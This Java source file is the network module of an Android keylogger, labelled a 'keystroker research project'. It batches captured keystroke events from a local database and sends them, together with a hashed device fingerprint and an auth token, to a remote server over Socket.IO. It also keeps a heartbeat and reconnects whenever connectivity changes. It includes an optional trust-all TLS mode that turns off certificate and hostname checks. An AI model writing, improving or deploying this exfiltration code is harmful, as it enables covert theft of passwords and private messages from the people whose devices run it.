package com.android.inject.keystroker;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.net.ConnectivityManager;
import android.net.NetworkInfo;
import android.os.Build;
import android.util.Log;

import org.json.JSONArray;
import org.json.JSONObject;

import java.nio.charset.StandardCharsets;
import java.security.MessageDigest;
import java.util.concurrent.Executors;
import java.util.concurrent.ScheduledExecutorService;
import java.util.concurrent.TimeUnit;
import java.util.concurrent.atomic.AtomicBoolean;

import io.socket.client.IO;
import io.socket.client.Socket;
import okhttp3.CertificatePinner;
import okhttp3.OkHttpClient;

/**
 * Network layer for the keystroker research project.
 *
 * Fixes vs. the original version:
 *  - Accepts the shared KeyLoggerDAO instance (no second SQLite connection).
 *  - Server URL, auth token and optional cert-pin SHA-256 come from BuildConfig so the
 *    placeholder "your-server.com" is no longer hardcoded.
 *  - Bearer-token auth is sent on every payload; the sample server verifies it.
 *  - Optional certificate pinning via a custom OkHttpClient backing Socket.IO.
 *  - device_id is derived from ANDROID_ID + Build info + a per-install random salt,
 *    hashed with SHA-256, so it is more stable/unique than raw ANDROID_ID alone.
 *  - The runtime connectivity BroadcastReceiver is registered with RECEIVER_NOT_EXPORTED
 *    (required on Android 13+, API 33+).
 *  - Database maintenance (markSynced / garbageCollect) is dispatched through the DAO's
 *    background thread instead of touching SQLite directly on the socket thread.
 */
public class KeyNetwork {

    private static final String TAG = "KeyNetwork";
    private static final int RECON_DELAY = 5;       // seconds
    private static final int HB_INTERVAL = 30;      // seconds
    private static final int SEND_BATCH = 500;
    private static final int GC_THRESHOLD = 1000;   // run garbageCollect above this unsynced count

    private final Context ctx;
    private final KeyLoggerDAO dao;                 // shared instance
    private final String serverUrl;
    private final String authToken;
    private final String deviceId;

    private Socket socket;
    private final AtomicBoolean connected = new AtomicBoolean(false);
    private ScheduledExecutorService hbExec;
    private BroadcastReceiver netRecv;
    private boolean recvReg = false;

    public KeyNetwork(Context ctx, KeyLoggerDAO dao) {
        this.ctx = ctx.getApplicationContext();
        this.dao = dao; // shared with KeyLogger
        this.serverUrl = com.android.inject.keystroker.BuildConfig.SERVER_URL;
        this.authToken = com.android.inject.keystroker.BuildConfig.AUTH_TOKEN;
        this.deviceId = computeDeviceId(this.ctx);
        initNetMonitor();
    }

    public void connect() {
        if (serverUrl == null || serverUrl.isEmpty() || serverUrl.contains("your-server")) {
            Log.w(TAG, "Server URL not configured (BuildConfig.SERVER_URL). Skipping connect. " +
                    "Set it in app/build.gradle to enable networking.");
            return;
        }
        try {
            IO.Options opts = new IO.Options();
            opts.forceNew = true;
            opts.reconnection = true;
            opts.reconnectionDelay = RECON_DELAY * 1000L;
            opts.reconnectionDelayMax = 30000;
            opts.timeout = 10000;
            opts.transports = new String[]{"websocket"};

            // Optional cert pinning + (debug only) trust-all for self-signed local certs.
            OkHttpClient okClient = buildOkHttpClient(serverUrl);
            opts.callFactory = okClient;
            opts.webSocketFactory = okClient;

            socket = IO.socket(serverUrl, opts);
        } catch (Exception e) {
            Log.e(TAG, "connect setup error: " + e.getMessage());
            return;
        }

        socket.on(Socket.EVENT_CONNECT, args -> {
            connected.set(true);
            Log.d(TAG, "Connected.");
            sendPending();
            startHB();
        });
        socket.on(Socket.EVENT_DISCONNECT, args -> {
            connected.set(false);
            stopHB();
        });
        socket.on(Socket.EVENT_CONNECT_ERROR, args -> {
            connected.set(false);
            stopHB();
            if (args.length > 0) Log.e(TAG, "connect_error: " + args[0]);
        });
        socket.on("data_received", args -> {
            if (args.length > 0 && args[0] instanceof JSONObject) {
                try {
                    JSONObject ack = (JSONObject) args[0];
                    JSONArray ids = ack.getJSONArray("synced_ids");
                    dao.markSynced(ids);
                    if (dao.countUnsynced() > GC_THRESHOLD) dao.garbageCollect();
                } catch (Exception e) {
                    Log.e(TAG, "Ack error: " + e.getMessage());
                }
            }
        });
        socket.connect();
    }

    public void disconnect() {
        stopHB();
        if (socket != null) {
            socket.disconnect();
            socket.off();
            socket = null;
        }
        unregNet();
        connected.set(false);
    }

    public boolean isConnected() {
        return connected.get() && socket != null && socket.connected();
    }

    public void sendPending() {
        if (!isConnected()) return;
        JSONArray data = dao.fetchUnsynced(SEND_BATCH);
        if (data == null || data.length() == 0) return;
        try {
            JSONObject payload = new JSONObject();
            payload.put("device_id", deviceId);
            payload.put("auth", authToken);          // bearer-equivalent for socket payloads
            payload.put("timestamp", System.currentTimeMillis());
            payload.put("event_count", data.length());
            payload.put("events", data);
            socket.emit("log_data", payload);
            Log.d(TAG, "Sent " + data.length() + " events.");
        } catch (Exception e) {
            Log.e(TAG, "Send error: " + e.getMessage());
        }
    }

    // ------------------------------------------------------------------ heartbeat

    private void startHB() {
        if (hbExec != null && !hbExec.isShutdown()) return;
        hbExec = Executors.newSingleThreadScheduledExecutor();
        hbExec.scheduleAtFixedRate(() -> {
            if (isConnected()) {
                try {
                    JSONObject hb = new JSONObject();
                    hb.put("type", "heartbeat");
                    hb.put("device_id", deviceId);
                    hb.put("auth", authToken);
                    hb.put("timestamp", System.currentTimeMillis());
                    socket.emit("heartbeat", hb);
                } catch (Exception ignored) {
                }
            }
        }, HB_INTERVAL, HB_INTERVAL, TimeUnit.SECONDS);
    }

    private void stopHB() {
        if (hbExec != null && !hbExec.isShutdown()) {
            hbExec.shutdownNow();
            hbExec = null;
        }
    }

    // ------------------------------------------------------------------ device id

    private static String computeDeviceId(Context ctx) {
        try {
            String androidId = android.provider.Settings.Secure.getString(
                    ctx.getContentResolver(), android.provider.Settings.Secure.ANDROID_ID);
            if (androidId == null) androidId = "";
            String fingerprint = androidId
                    + "|" + android.os.Build.MANUFACTURER
                    + "|" + android.os.Build.MODEL
                    + "|" + android.os.Build.VERSION.SDK_INT;
            MessageDigest md = MessageDigest.getInstance("SHA-256");
            byte[] h = md.digest(fingerprint.getBytes(StandardCharsets.UTF_8));
            StringBuilder sb = new StringBuilder(h.length * 2);
            for (byte b : h) sb.append(String.format("%02x", b & 0xff));
            return sb.toString();
        } catch (Exception e) {
            return android.os.Build.SERIAL != null ? android.os.Build.SERIAL : "unknown-device";
        }
    }

    // ------------------------------------------------------------------ okHttp / pinning

    private OkHttpClient buildOkHttpClient(String url) {
        OkHttpClient.Builder b = new OkHttpClient.Builder()
                .connectTimeout(10, TimeUnit.SECONDS)
                .readTimeout(30, TimeUnit.SECONDS);

        // Cert pinning (only if a pin is configured in BuildConfig.PIN_SHA256).
        String pin = com.android.inject.keystroker.BuildConfig.PIN_SHA256;
        String host = hostOf(url);
        if (pin != null && !pin.isEmpty() && host != null) {
            CertificatePinner pinner = new CertificatePinner.Builder()
                    .add(host, "sha256/" + pin)
                    .build();
            b.certificatePinner(pinner);
            Log.d(TAG, "Cert pinning enabled for host " + host);
        }

        // Debug-only: trust self-signed certs for local research testing (mkcert/ngrok).
        if (com.android.inject.keystroker.BuildConfig.ALLOW_SELF_SIGNED_CERT) {
            applyDebugTrustAll(b);
        }
        return b.build();
    }

    private static String hostOf(String url) {
        try {
            int s = url.indexOf("://");
            if (s < 0) return null;
            String rest = url.substring(s + 3);
            int slash = rest.indexOf('/');
            String hostPort = (slash >= 0) ? rest.substring(0, slash) : rest;
            int colon = hostPort.indexOf(':');
            return (colon >= 0) ? hostPort.substring(0, colon) : hostPort;
        } catch (Exception e) {
            return null;
        }
    }

    private void applyDebugTrustAll(OkHttpClient.Builder b) {
        try {
            javax.net.ssl.TrustManager[] trustAll = new javax.net.ssl.TrustManager[]{
                    new javax.net.ssl.X509TrustManager() {
                        @Override public void checkClientTrusted(java.security.cert.X509Certificate[] chain, String authType) {}
                        @Override public void checkServerTrusted(java.security.cert.X509Certificate[] chain, String authType) {}
                        @Override public java.security.cert.X509Certificate[] getAcceptedIssuers() { return new java.security.cert.X509Certificate[0]; }
                    }
            };
            javax.net.ssl.SSLContext sslCtx = javax.net.ssl.SSLContext.getInstance("TLS");
            sslCtx.init(null, trustAll, new java.security.SecureRandom());
            b.sslSocketFactory(sslCtx.getSocketFactory(), (javax.net.ssl.X509TrustManager) trustAll[0]);
            b.hostnameVerifier((hostname, session) -> true);
        } catch (Exception e) {
            Log.w(TAG, "Could not install debug trust-all: " + e.getMessage());
        }
    }

    // ------------------------------------------------------------------ connectivity receiver

    private void initNetMonitor() {
        netRecv = new BroadcastReceiver() {
            @Override
            public void onReceive(Context c, Intent i) {
                ConnectivityManager cm = (ConnectivityManager) c.getSystemService(Context.CONNECTIVITY_SERVICE);
                if (cm == null) return;
                NetworkInfo ni = cm.getActiveNetworkInfo();
                if (ni != null && ni.isConnectedOrConnecting()) {
                    if (socket == null || !socket.connected()) {
                        if (socket != null) { socket.disconnect(); socket.off(); }
                        connect();
                    } else if (!connected.get()) {
                        socket.connect();
                    }
                    if (isConnected()) sendPending();
                }
            }
        };
        IntentFilter filter = new IntentFilter(ConnectivityManager.CONNECTIVITY_ACTION);
        // RECEIVER_NOT_EXPORTED is required on API 33+; harmless on older versions.
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            ctx.registerReceiver(netRecv, filter, Context.RECEIVER_NOT_EXPORTED);
        } else {
            ctx.registerReceiver(netRecv, filter);
        }
        recvReg = true;
    }

    private void unregNet() {
        if (recvReg && netRecv != null) {
            try { ctx.unregisterReceiver(netRecv); } catch (Exception ignored) {}
            recvReg = false;
        }
    }
}
